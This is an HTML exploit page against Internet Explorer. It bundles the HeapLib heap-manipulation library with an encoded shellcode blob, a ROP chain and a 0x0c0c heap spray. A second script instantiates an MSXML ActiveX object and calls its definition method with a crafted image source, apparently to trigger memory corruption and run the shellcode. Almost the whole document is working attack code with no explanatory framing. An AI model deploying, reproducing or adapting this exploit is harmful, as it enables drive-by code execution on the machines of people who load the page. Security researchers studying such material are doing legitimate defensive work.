<html>
<head>
<script>
//
//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//  
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
// 
// The HeapLib library is licensed under a BSD license, the text of which follows:
// 
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//
 
//
// heapLib namespace
//

function heapLib() {
}


//
// heapLib class
//

// heapLib.ie constructor
//
// Creates a new heapLib API object for Internet Explorer. The maxAlloc
// argument sets the maximum block size that can be allocated using the alloc()
// function.
//
// Arguments:
//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
//    heapBase - base of the default process heap (defaults to 0x150000)
//

heapLib.ie = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);

    // Allocate a padding string that uses maxAlloc bytes
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    // Create an array for storing references to allocated memory
    this.mem = new Array();

    // Call flushOleaut32() once to allocate the maximum size blocks
    this.flushOleaut32();
}


//
// Outputs a debugging message in WinDbg. The msg argument must be a string
// literal. Using string concatenation to build the message will result in heap
// allocations.
//
// Arguments:
//    msg - string to output
//

heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}


//
// Enables or disables logging of heap operations in WinDbg.
//
// Arguments:
//    enable - a boolean value, set to true to enable heap logging
//

heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}


//
// Triggers a breakpoint in the debugger.
//

heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}


//
// Returns a string of a specified length, up to the maximum allocation size
// set in the heapLib.ie constructor. The string contains "A" characters.
//
// Arguments:
//    len - length in characters
//

heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}


//
// Returns a number rounded up to a specified value.
//
// Arguments:
//    num   - integer to round
//    round - value to round to
//

heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}


//
// Converts an integer to a hex string. This function uses the heap.
//
// Arguments:
//    num   - integer to convert
//    width - pad the output with zeros to a specified width (optional)
//

heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}


//
// Convert a 32-bit address to a 4-byte string with the same representation in
// memory. This function uses the heap.
//
// Arguments:
//    addr - integer representation of the address
//

heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


//
// Allocates a block of a specified size with the OLEAUT32 alloc function.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    // Create an array for this tag if doesn't already exist
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        // Allocate a new block with strdup of the string argument
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        // Allocate the block
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}


//
// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
// allocator.
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    // Run the garbage collector
    CollectGarbage();
}


//
// The JScript interpreter uses the OLEAUT32 memory allocator for all string
// allocations. This allocator stores freed blocks in a cache and reuses them
// for later allocations. The cache consists of 4 bins, each storing up to 6
// blocks. Each bin holds blocks of a certain size range:
//
//    0 - 32
//    33 - 64
//    65 - 256
//    257 - 32768
//
// When a block is freed by the OLEAUT32 free function, it is stored in one of
// the bins. If the bin is full, the smallest block in the bin is freed with
// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
// bytes are not cached and are freed directly.
//
// To flush the cache, we need to free 6 blocks of the maximum size for each
// bin. The maximum size blocks will push out all smaller blocks from the
// cache. Then we allocate the maximum size blocks again, leaving the cache
// empty.
//
// You need to call this function once to allocate the maximum size blocks
// before you can use it to flush the cache.
//

heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    // Free the maximum size blocks and push out all smaller blocks

    this.freeOleaut32("oleaut32");
    
    // Allocate the maximum sized blocks again, emptying the cache

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}


//
// Allocates a block of a specified size with the system memory allocator. A
// call to this function is equivalent to a call to HeapAlloc(). If the first
// argument is a number, it specifies the size of the new block, which is
// filled with "A" characters. If the argument is a string, its data is copied
// into a new block of size arg.length * 2 + 6. In both cases the size of the
// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
//
// Arguments:
//    arg - size of the memory block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    // Allocate the block with the OLEAUT32 allocator
    this.allocOleaut32(arg, tag);
}


//
// Frees all memory blocks marked with a specific tag with the system memory
// allocator. A call to this function is equivalent to a call to HeapFree().
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.free = function(tag) {

    // Free the blocks with the OLEAUT32 free function
    this.freeOleaut32(tag);

    // Flush the OLEAUT32 cache
    this.flushOleaut32();
}


//
// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
// function before before using alloc() and free().
//

heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}


//
// Adds blocks of the specified size to the free list and makes sure they are
// not coalesced. The heap must be defragmented before calling this function.
// If the size of the memory blocks is less than 1024, you have to make sure
// that the lookaside is full.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many free blocks to add to the list (defaults to 1)
//

heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}


//
// Add blocks of the specified size to the lookaside. The lookaside must be
// empty before calling this function.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many blocks to add to the lookaside (defaults to 1)
//

heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}


//
// Return the address of the head of the lookaside linked list for blocks of a
// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//

heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    // The lookahead array starts at heapBase + 0x688. It contains a 48 byte
    // structure for each block size + header size in 8 byte increments.

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}


//
// Returns a fake vtable that contains shellcode. The caller should free the
// vtable to the lookaside and use the address of the lookaside head as an
// object pointer. When the vtable is used, the address of the object must be
// in eax and the pointer to the vtable must be in ecx. Any virtual function
// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
// execution. This function uses the heap.
//
// Arguments:
//    shellcode - shellcode string
//    jmpecx    - address of a jmp ecx or equivalent instruction
//    size      - size of the vtable to generate (defaults to 1008 bytes)
//

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);

    // Make sure the size is valid
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

    // Build the fake vtable that will go on the lookaside list
    //
    // lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
    // 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

    var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    // If the vtable is the only entry on the lookaside, the first 4 bytes will
    // be 00 00 00 00, which disassembles as two add [eax], al instructions.
    // The jmp ecx trampoline will jump back to the beginning of the vtable and
    // execute the add [eax], al instructions. We need to use two sub [eax], al
    // instructions to fix the heap.

    vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
              shellcode + heap.padding((size-138)/2 - shellcode.length);

    return vtable;
}


var heap_obj = new heapLib.ie(0x20000);
var code = unescape("%u83b9%u32e3%u24eb%ub71d%ub8b1%uf539%uf82b%uf781%ufed2%uc0c6%u92fc%ub015%u0873%u75fd%u8449%u78d6%u4e46%u0d42%u4814%u9998%u91b6%u4337%u77ba%u4b7b%u4a3c%u2db2%ubf35%u70be%u974f%u6627%u7941%u2024%ue1f6%u7c77%u893d%u73e3%u347e%u7a25%ueb19%u2976%u1de2%u9099%u3ca9%ud28c%ub4d4%u1597%u812f%u43d6%ub537%u91b0%u467f%u67b3%u0d93%u8d4a%u7448%ufd13%ub9b6%u9fb1%u427d%u4b78%ufc2b%u729b%uf839%u964f%u7bbf%u3f75%u98a8%uff86%uc0c7%u27d5%ubb40%u711c%u0c2c%ub841%u924e%u05ba%u49b2%ud187%ue0d0%ube35%u7004%u0847%u21f5%ub7f9%u142d%ufd1b%ueb18%ufc6b%u7b76%ube37%u7905%ue131%u7470%u0372%u78f8%ub167%u904e%u3cba%uf502%u04b3%u462c%ubb40%ub0b6%uf930%ua82f%ub292%u732d%ue33a%u9f1c%ub999%ud432%u93b8%u3d14%ub435%u7f7d%ub50c%u7727%ud611%uff33%uc1c6%u43e2%u01b7%u4be0%u1566%u7c71%u7e3f%ud52a%u7a4a%u9b34%u98a9%u0d42%ubf1d%u4724%u2549%u4f97%u9141%u968d%u4875%u8840%uebd3%u7175%u7677%uf738%u69e2%ubad5%ue083%uf53b%ufd80%ub890%ubb05%u1db3%ub193%u46b4%u4b98%u0a74%ub2d6%u2c7a%u9b43%u7d67%u9142%ua8b7%ufc10%u3fbe%u4e96%u2d48%u787e%u233c%u4ff8%ud485%u41b6%u04b9%u247c%u8d92%u9949%ue328%u277b%u724a%u2f0c%u97bf%u1473%u1566%ua934%u7fb0%uf90b%u1c9f%u793d%u4735%u8425%u0de1%ub537%u7970%u4077%u1a90%u09eb%u74e2%u1d35%ub097%u8cb5%u24e3%ubabe%u7504%u7f1c%uf522%u464a%u7142%u0d2f%u7d67%u964b%u1266%u47d5%ua805%u0b48%u43fc%u1572%ubbb9%u8d41%u1b99%u4ff9%u7e78%ud601%u9214%uf883%u70b2%ub13d%u9837%ub64e%ue108%u257b%u03b3%ub8d4%u9b3c%u9134%u13bf%ub7fd%ue01a%u2d7c%u9f0c%u2c7a%u3f73%u49b4%u27a9%u7693%u747d%u7e7f%u4f0d%uf687%u25e1%u80be%u76e2%u790c%u787c%ubb35%u2892%ufcd0%ub624%uf829%u1d72%u992d%u197a%u4be3%ub01c%uf53b%u1149%u7be0%u3f48%u9b93%uc133%u81d6%u47eb%u2114%ua8f9%ufd32%ubf8d%u73b2%ub515%u2f77%u4204%u91b1%u98ba%u4e27%u4390%u3771%u4634%ub3b8%u09a9%uc0fe%u40d5%u75b7%ud40a%ub405%u6697%u3c2c%u9f96%u4167%u703d%ub94a%u04b6%u6777%ub941%u9748%ud23a%ue2d3%u7f05%u2366%u35f9%ue388%u2c7e%ud686%ue022%u4b3d%ub343%u7242%u7971%ub24a%ub1b0%u989f%uf518%u2790%u3937%u20eb%u24fd%u8d99%u7670%ub540%ua846%u9bbe%ubab8%u854e%u93fc%u147b%u7d75%u342f%u7a1c%ubf49%ua992%ue112%u7c15%u7378%ud56b%ud42b%u1074%u0de1%u4f76%u3c77%u4774%u1d79%u7fb4%uf802%u7396%ue32a%u7525%u913f%u3172%u0ceb%u71b7%ubb2d%u8db2%u427d%u2c7a%uf784%u3de0%u9691%ub82d%u70a9%u9f1d%u7b93%u7e24%ud130%u27e2%u3ffc%ub9b1%u0d7c%u4a49%u4805%u90f9%uf889%u673c%ub4bb%u69b6%u98d4%u37be%uf5b5%u34a8%u2f25%ub74e%uba15%u3546%ub343%u4f1c%u0c78%u9b97%u04b0%u92bf%u6614%u384b%u40d5%u47fd%ud641%uba99%u8107%ufb1a%udadb%u74d9%uf424%u3358%ub1c9%u3133%u1250%u5003%u8312%u7def%u0ef8%u9513%uf074%u66eb%u78e7%u570e%u1e35%uca5b%u5489%ue709%u3862%u7cb9%u9506%u35ce%uc3ad%uc6e1%ucc03%u05ad%ub005%u59af%u89e5%uac60%ucee4%u5f9c%u87b4%uf2eb%ua329%ucea9%u6348%u6fa6%u0633%u1b78%u0989%ub4a8%u4286%ube50%u72c1%u1361%u4e12%u1828%u24e1%uc8ab%uc43b%u349a%ufb97%ub913%u3ce9%u2293%u369c%udfe0%u8ca7%u3b9b%u112d%ucf3b%uf195%u1cba%u7143%ue9b0%udd07%uecd4%u55c4%u65e0%ub9eb%u3d61%u1dc8%ue52a%u0771%u4896%u578d%u347e%u132b%u216c%u7e4d%ub4fa%u04df%ub643%u06df%udfe3%u8dee%ua76c%u47ee%u57c9%ucaa5%uf07b%u9f60%u9d3e%u7592%u987c%u7c10%u5ffc%uf508%u24f9%ue58e%u3473%u0a7b%u3520%u69ae%ua5a7%u4032%u4e42%u9cd0");
var nops = unescape("%u0c0c%u0c0c");
var nops_90 = unescape("%ub50c%u934e");
var rop_chain = unescape("%u7f98%u7c34%u6541%u7c37%u8b05%u7c34%u7f98%u7c34%u7f98%u7c34%u7f98%u7c34%u7f98%u7c34%u653d%u7c37%u1000%u0000%u7f98%u7c34%u15a2%u7c34%uffff%uffff%u6402%u7c37%u5255%u7c34%u2174%u7c35%u4f87%u7c34%u0040%u0000%ud201%u7c34%ub001%u7c38%u7f97%u7c34%ua151%u7c37%u8c81%u7c37%u5c30%u7c34");

while (nops.length < 0x80000) nops += nops;
while (nops_90.length < 0x80000) nops_90 += nops_90;

var offset = nops.substring(0, 0x0);
var nops_padding = nops.substring(0, 0x5f4-code.length-offset.length);
var shellcode = offset + code + nops_padding + rop_chain + nops_90.substring(0, 0x800-code.length-nops_padding.length-rop_chain.length);


while (shellcode.length < 0x40000) shellcode += shellcode;
var block = shellcode.substring(0, (0x80000-6)/2);


heap_obj.gc();
for (var z=1; z < 0x230; z++) {
	heap_obj.alloc(block);
}


</script>
</head>
<body>
<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="eGvI"></object>
<script>
var obj = document.getElementById('eGvI').object;
var src = unescape("%u0c08%u0c0c");
while (src.length < 0x1002) src += src;
src = "\\\\xxx" + src;
src = src.substr(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(156);
</script>
</body>
</html>
